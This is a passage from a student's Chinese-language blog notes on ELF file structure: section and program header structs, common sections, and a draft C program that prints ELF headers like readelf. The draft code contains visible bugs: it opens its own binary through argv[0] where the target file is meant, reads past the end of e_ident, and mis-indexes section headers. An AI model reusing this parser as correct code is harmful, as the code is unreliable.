src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230322094613842.png\" alt=\"image-20230322094613842\"></p>\n<p>​\t这个下标范围标错了吧….</p>\n<h2 id=\"ELF节表头-shdr\"><a href=\"#ELF节表头-shdr\" class=\"headerlink\" title=\"ELF节表头 shdr\"></a>ELF节表头 shdr</h2><p>​\t\te_shoff是 0x19a8(小端)</p>\n<p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230322100247070.png\" alt=\"image-20230322100247070\"></p>\n<p>​\t\t可以看到0x19a8开始,存储的是各个节的内容</p>\n<p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230322100349315.png\" alt=\"image-20230322100349315\"></p>\n<p>​\t\t结构如下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/* Section header.  */</span><br><span class=\"line\"> </span><br><span class=\"line\">typedef struct</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    Elf32_Word  sh_name;        /* Section name (string tbl index) */</span><br><span class=\"line\">    Elf32_Word  sh_type;        /* Section type */</span><br><span class=\"line\">    Elf32_Word  sh_flags;       /* Section flags */</span><br><span class=\"line\">    Elf32_Addr  sh_addr;        /* Section virtual addr at execution */</span><br><span class=\"line\">    Elf32_Off   sh_offset;      /* Section file offset */</span><br><span class=\"line\">    Elf32_Word  sh_size;        /* Section size in bytes */</span><br><span class=\"line\">    Elf32_Word  sh_link;        /* Link to another section */</span><br><span class=\"line\">    Elf32_Word  sh_info;        /* Additional section information */</span><br><span class=\"line\">    Elf32_Word  sh_addralign;       /* Section alignment */</span><br><span class=\"line\">    Elf32_Word  sh_entsize;     /* Entry size if section holds table */</span><br><span class=\"line\">&#125; Elf32_Shdr;</span><br><span class=\"line\"> </span><br><span class=\"line\">typedef struct</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    Elf64_Word  sh_name;        /* Section name (string tbl index) */ 名称,值是在string表的索引</span><br><span class=\"line\">    Elf64_Word  sh_type;        /* Section type */</span><br><span class=\"line\">    Elf64_Xword sh_flags;       /* Section flags */  标记属性 读写执行</span><br><span class=\"line\">    Elf64_Addr  sh_addr;        /* Section virtual addr at execution */   虚拟地址</span><br><span class=\"line\">    Elf64_Off   sh_offset;      /* Section file offset */\t\t\t在文件中的偏移</span><br><span class=\"line\">    Elf64_Xword sh_size;        /* Section size in bytes */\t\t\t大小</span><br><span class=\"line\">    Elf64_Word  sh_link;        /* Link to another section */</span><br><span class=\"line\">    Elf64_Word  sh_info;        /* Additional section information */</span><br><span class=\"line\">    Elf64_Xword sh_addralign;       /* Section alignment */</span><br><span class=\"line\">    Elf64_Xword sh_entsize;     /* Entry size if section holds table */</span><br><span class=\"line\">&#125; Elf64_Shdr;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"sh-name\"><a href=\"#sh-name\" class=\"headerlink\" title=\"sh_name\"></a>sh_name</h3><p>​\t\t这里存储的是节名的下标,节名实际存在于.shstrtab中,这里存的是在shstrtab中的下标.</p>\n<h2 id=\"节-section\"><a href=\"#节-section\" class=\"headerlink\" title=\"节 section\"></a>节 section</h2><h3 id=\"text节\"><a href=\"#text节\" class=\"headerlink\" title=\".text节\"></a>.text节</h3><p>​\t\t保存了程序代码指令的代码节. 一段可执行程序如果存在Phdr, .text字节就会存在于text段中(<font color=\"red\">如果不存在呢??</font>)</p>\n<h3 id=\"rodata节\"><a href=\"#rodata节\" class=\"headerlink\" title=\".rodata节\"></a>.rodata节</h3><p>​\t\t保存只读数据,如一行c语言代码中的字符串  printf(“hello world\\n”); 因为是只读,所以也放到了text段</p>\n<h3 id=\"data节\"><a href=\"#data节\" class=\"headerlink\" title=\".data节\"></a>.data节</h3><p>​\t\t保存了初始的全局变量等数据.存在于data段</p>\n<h3 id=\"bss节\"><a href=\"#bss节\" class=\"headerlink\" title=\".bss节\"></a>.bss节</h3><p>​\t\t保存了未进行初始化的全局数据,存在于data段.</p>\n<h3 id=\"plt\"><a href=\"#plt\" class=\"headerlink\" title=\".plt\"></a>.plt</h3><p>​\t\t包含了动态链接器调用从共享库导入的函数所必需的相关代码. 存在于text段中,同样保存了代码.</p>\n<p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230303132136453.png\" alt=\"image-20230303132136453\"></p>\n<h3 id=\"got\"><a href=\"#got\" class=\"headerlink\" title=\".got\"></a>.got</h3><p>​\t\t保存了全局偏移表.这个存的是变量</p>\n<p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230228164021947.png\" alt=\"image-20230228164021947\"></p>\n<h3 id=\"got-plt\"><a href=\"#got-plt\" class=\"headerlink\" title=\".got.plt\"></a>.got.plt</h3><p>​\t\t这个存的是函数引用</p>\n<h3 id=\"dynsym\"><a href=\"#dynsym\" class=\"headerlink\" title=\".dynsym\"></a>.dynsym</h3><p>​\t\t保存了从共享库导入的动态符号信息,该节保存在text段中</p>\n<h3 id=\"dynstr\"><a href=\"#dynstr\" class=\"headerlink\" title=\".dynstr\"></a>.dynstr</h3><p>​\t\t保存了动态符号字符串表,表中存放了一系列字符串,这些字符串表示符号的名称,以空字符00作为终止符</p>\n<h2 id=\"ELF程序头-phdr-segment段\"><a href=\"#ELF程序头-phdr-segment段\" class=\"headerlink\" title=\"ELF程序头 phdr (segment段)\"></a>ELF程序头 phdr (segment段)</h2><p>​\t\t程序头中描述了可执行文件的段信息,即程序如何加载到内存以及内存中的布局.</p>\n<p>​\t\t程序头可以通过elf文件头的e_phoff（程序头表偏移量）字段来得到位置</p>\n<p>​\t\t它主要有5种类型</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* Program segment header.  */</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    Elf32_Word  p_type;         <span class=\"comment\">/* Segment type */</span></span><br><span class=\"line\">    Elf32_Off   p_offset;       <span class=\"comment\">/* Segment file offset */</span></span><br><span class=\"line\">    Elf32_Addr  p_vaddr;        <span class=\"comment\">/* Segment virtual address */</span></span><br><span class=\"line\">    Elf32_Addr  p_paddr;        <span class=\"comment\">/* Segment physical address */</span></span><br><span class=\"line\">    Elf32_Word  p_filesz;       <span class=\"comment\">/* Segment size in file */</span></span><br><span class=\"line\">    Elf32_Word  p_memsz;        <span class=\"comment\">/* Segment size in memory */</span></span><br><span class=\"line\">    Elf32_Word  p_flags;        <span class=\"comment\">/* Segment flags , I.E execute|read|write */</span></span><br><span class=\"line\">    Elf32_Word  p_align;        <span class=\"comment\">/* Segment alignment */</span></span><br><span class=\"line\">&#125; Elf32_Phdr;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> &#123;</span></span><br><span class=\"line\">\tElf64_Word\tp_type;    <span class=\"comment\">//类型</span></span><br><span class=\"line\">\tElf64_Word\tp_flags;   <span class=\"comment\">// 读写执行权限</span></span><br><span class=\"line\">\tElf64_Off\tp_offset;   <span class=\"comment\">//文件中的偏移</span></span><br><span class=\"line\">\tElf64_Addr\tp_vaddr;  <span class=\"comment\">//虚拟地址</span></span><br><span class=\"line\">\tElf64_Addr\tp_paddr;  <span class=\"comment\">//物理地址</span></span><br><span class=\"line\">\tElf64_Xword\tp_filesz; <span class=\"comment\">//在文件中的大小\t</span></span><br><span class=\"line\">\tElf64_Xword\tp_memsz;\t<span class=\"comment\">//在内存中的大小</span></span><br><span class=\"line\">\tElf64_Xword\tp_align;  <span class=\"comment\">//</span></span><br><span class=\"line\">&#125; Elf64_Phdr;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"PT-LOAD\"><a href=\"#PT-LOAD\" class=\"headerlink\" title=\"PT_LOAD\"></a>PT_LOAD</h3><p>​\t\t一个可执行文件至少有一个该类型的段.PT_LOAD表述的是可装载的段,这种类型的段会被装载或者映射到内存中,</p>\n<h2 id=\"编译器如何对节段进行组织安排\"><a href=\"#编译器如何对节段进行组织安排\" class=\"headerlink\" title=\"编译器如何对节段进行组织安排\"></a>编译器如何对节段进行组织安排</h2><p>​\t\t这里所说的是编译环节,从源代码到二进制文件.</p>\n<h2 id=\"ELF装载过程\"><a href=\"#ELF装载过程\" class=\"headerlink\" title=\"ELF装载过程\"></a>ELF装载过程</h2><p>​\t\t这里是指把二进制文件加载进内存的过程</p>\n<h1 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h1><h2 id=\"一个elf程序或者动态库是否必须有某些节-他们固定的名字和含义\"><a href=\"#一个elf程序或者动态库是否必须有某些节-他们固定的名字和含义\" class=\"headerlink\" title=\"一个elf程序或者动态库是否必须有某些节,他们固定的名字和含义\"></a>一个elf程序或者动态库是否必须有某些节,他们固定的名字和含义</h2><p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230323221121391.png\" alt=\"image-20230323221121391\"></p>\n<h2 id=\"编译器如何对这些段进行编排和组织-顺序是否可以任意调换\"><a href=\"#编译器如何对这些段进行编排和组织-顺序是否可以任意调换\" class=\"headerlink\" title=\"编译器如何对这些段进行编排和组织,顺序是否可以任意调换\"></a>编译器如何对这些段进行编排和组织,顺序是否可以任意调换</h2><p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230323221148505.png\" alt=\"image-20230323221148505\"></p>\n<h2 id=\"是否可以欺骗程序加载器或者反汇编引擎（例如，增、删、改text段）\"><a href=\"#是否可以欺骗程序加载器或者反汇编引擎（例如，增、删、改text段）\" class=\"headerlink\" title=\"是否可以欺骗程序加载器或者反汇编引擎（例如，增、删、改text段）\"></a>是否可以欺骗程序加载器或者反汇编引擎（例如，增、删、改text段）</h2><p><img src=\"/ucas-%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%8F%91%E7%8E%B0-elf%E5%88%86%E6%9E%90%E4%B8%8E%E8%A7%A3%E6%9E%90%E5%AE%9E%E7%8E%B0/image-20230323221203956.png\" alt=\"image-20230323221203956\"></p>\n<p>文件头52????</p>\n<p>magic number16字节 还剩36字节 </p>\n<p>8*2 + 4 * 2 + 4 + 4 * 2 &#x3D; 36</p>\n<p>0x3e &#x3D; 62 </p>\n<h1 id=\"测试\"><a href=\"#测试\" class=\"headerlink\" title=\"测试\"></a>测试</h1><p>删除一些段,程序是否还能正常运行? 程序必须的段 节是哪些??</p>\n<p>怎么增删改text段等 欺骗编译器等</p>\n<h1 id=\"代码编写\"><a href=\"#代码编写\" class=\"headerlink\" title=\"代码编写\"></a>代码编写</h1><p>自己也要编译成32位才行</p>\n<p>gcc -m32 1.c &amp;&amp; .&#x2F;a.out test</p>\n<p>可以参考readelf</p>\n<p>先把32位的都给写好,然后再加上64位的</p>\n<p>1.改进,32位 64位,根据文件头判断,然后再进行解析</p>\n<p>解析段和节,名称 起始和结束位置, 大小,权限</p>\n<p>fatal error: elf32.h: No such file or directory<br> #include &lt;elf32.h&gt;</p>\n<p>fatal error: bits&#x2F;libc-header-start.h: No such file or directory</p>\n<p><a href=\"https://stackoverflow.com/questions/54082459/fatal-error-bits-libc-header-start-h-no-such-file-or-directory-while-compili\">https://stackoverflow.com/questions/54082459/fatal-error-bits-libc-header-start-h-no-such-file-or-directory-while-compili</a></p>\n<p>e_ident 怎么输出多位, c</p>\n<p>怎么定义空格字符呢?</p>\n<p>gcc -m32 1.c  需要编译成32位的,目前也只能解析32位程序</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;errno.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;elf.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/mman.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;sys/stat.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;fcntl.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 解析文件头</span></span><br><span class=\"line\"><span class=\"comment\">// int check_elf_head(file)</span></span><br><span class=\"line\"><span class=\"comment\">// &#123;</span></span><br><span class=\"line\"><span class=\"comment\">//     printf(&quot;just a test%d\\n&quot;,file[0]);</span></span><br><span class=\"line\"><span class=\"comment\">//     return 0;</span></span><br><span class=\"line\"><span class=\"comment\">// &#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> **argv)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">     <span class=\"type\">int</span> fd, i;</span><br><span class=\"line\">    <span class=\"type\">uint8_t</span> *mem;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">stat</span> <span class=\"title\">st</span>;</span></span><br><span class=\"line\">    <span class=\"type\">char</span> *StringTable, *interp;</span><br><span class=\"line\"></span><br><span class=\"line\">    Elf32_Ehdr *Elf_header;</span><br><span class=\"line\">    Elf32_Phdr *Pro_header;</span><br><span class=\"line\">    Elf32_Shdr *Section_header;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (argc &lt; <span class=\"number\">2</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;usage: %s &lt;executable&gt; \\n&quot;</span>, argv[<span class=\"number\">0</span>]);</span><br><span class=\"line\">        <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> ((fd = open(argv[<span class=\"number\">0</span>], O_RDONLY)) &lt; <span class=\"number\">0</span>) <span class=\"comment\">//什么情况下会这样呢? 和权限好像没关系</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        perror(<span class=\"string\">&quot;open&quot;</span>);</span><br><span class=\"line\">        <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> (fstat(fd, &amp;st) &lt; <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        perror(<span class=\"string\">&quot;fstat&quot;</span>);</span><br><span class=\"line\">        <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    mem = mmap(<span class=\"literal\">NULL</span>, st.st_size, PROT_READ, MAP_PRIVATE, fd, <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 64位还是32位</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (mem[<span class=\"number\">4</span>] == <span class=\"number\">0x2</span>)</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;it is 64 bit %d\\n&quot;</span>,mem[<span class=\"number\">4</span>]);</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;it is 32 bit %d\\n&quot;</span>,mem[<span class=\"number\">4</span>]);</span><br><span class=\"line\">    <span class=\"comment\">// check_elf_head(mem);</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//头部信息</span></span><br><span class=\"line\">    Elf_header = (Elf32_Ehdr *)mem;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;e_ident:                           \\t%10x\\n&quot;</span>,Elf_header-&gt;e_ident[<span class=\"number\">16</span>]);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Type:                           \\t%d\\n&quot;</span>,Elf_header-&gt;e_type);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Machine:                        \\t%d\\n&quot;</span>,Elf_header-&gt;e_machine);  <span class=\"comment\">/* Architecture */</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Version:                        \\t%#02x\\n&quot;</span>,Elf_header-&gt;e_version);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Entry point address:            \\t%#02x\\n&quot;</span>,Elf_header-&gt;e_entry);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Start of program headers:       \\t%d(bytes)\\n&quot;</span>,Elf_header-&gt;e_phoff);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Start of section headers:       \\t%d(bytes)\\n&quot;</span>,Elf_header-&gt;e_shoff);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Flags:                          \\t%#02x\\n&quot;</span>,Elf_header-&gt;e_flags);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Size of this header:            \\t%d(bytes)\\n&quot;</span>,Elf_header-&gt;e_ehsize);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Size of program headers:        \\t%d(bytes)\\n&quot;</span>,Elf_header-&gt;e_phentsize);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Number of program headers:      \\t%d\\n&quot;</span>,Elf_header-&gt;e_phnum);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Size of section headers:        \\t%d(bytes)\\n&quot;</span>,Elf_header-&gt;e_shentsize);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Number of section headers:      \\t%d\\n&quot;</span>,Elf_header-&gt;e_shnum);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Section header string table index:\\t%d\\n&quot;</span>,Elf_header-&gt;e_shstrndx);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 解析节信息 readelf  -S</span></span><br><span class=\"line\">    Section_header = (Elf32_Shdr *)&amp;mem[Elf_header-&gt;e_shoff];</span><br><span class=\"line\">    StringTable = &amp;mem[Section_header[Elf_header-&gt;e_shstrndx].sh_offset];</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Section header list:\\n\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"type\">char</span> a = <span class=\"string\">&#x27;|&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// size flag</span></span><br><span class=\"line\">    <span class=\"comment\">// for (i = 1; i &lt; Elf_header-&gt;e_shnum; i++) &#123;</span></span><br><span class=\"line\">    <span class=\"comment\">//     printf(&quot;%-20s\\t\\t%-10x\\t\\t0x%x\\t\\t%x\\t\\t%c\\n&quot;,&amp;StringTable[shdr[i].sh_name],shdr[i].sh_type,shdr[i].sh_addr,shdr[i].sh_size,shdr[i].sh_flags);</span></span><br><span class=\"line\">    <span class=\"comment\">// &#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;[Nr] Name%-20c\\t\\tType%-10c\\tAddr\\t\\tOff\\tSize\\tES Flg  Al&quot;</span>,a);</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i = <span class=\"number\">1</span>; i&lt;Elf_header-&gt;e_shnum; i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\"><span class=\"comment\">/*printf(&quot;\\n[%-2d]  %-20s              %-10x            %08x     %06x    %06x   %02x %02x  %02x &quot;\\</span></span><br><span class=\"line\"><span class=\"comment\"> */</span>     <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n[%-2d]  %-20s\\t\\t%-10x\\t%08x\\t%06x\\t%06x\\t%02x %02x  %02x &quot;</span>\\</span><br><span class=\"line\">               , i,&amp;StringTable[Section_header-&gt;sh_name],Section_header-&gt;sh_type,Section_header-&gt;sh_addr,\\</span><br><span class=\"line\">               Section_header-&gt;sh_offset,Section_header-&gt;sh_size,Section_header-&gt;sh_entsize,\\</span><br><span class=\"line\">               Section_header-&gt;sh_flags,Section_header-&gt;sh_addralign);</span><br><span class=\"line\">        Section_header++;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 解析段信息</span></span><br><span class=\"line\"><span class=\"comment\">// readelf -l</span></span><br><span class=\"line\">    Pro_header = (Elf32_Phdr *)&amp;mem[Elf_header-&gt;e_phoff];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;\\n/*****Program Headers:*****/\\n&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;starting at offset: %d\\n&quot;</span>,Elf_header-&gt;e_phoff);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Number of program headers: %d\\n&quot;</span>,Elf_header-&gt;e_phnum);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Type           Offset   VirtAddr   PhysAddr   FileSiz     MemSiz    Flg\\n&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span>(i = <span class=\"number\">0</span>; i&lt;Elf_header-&gt;e_phnum; 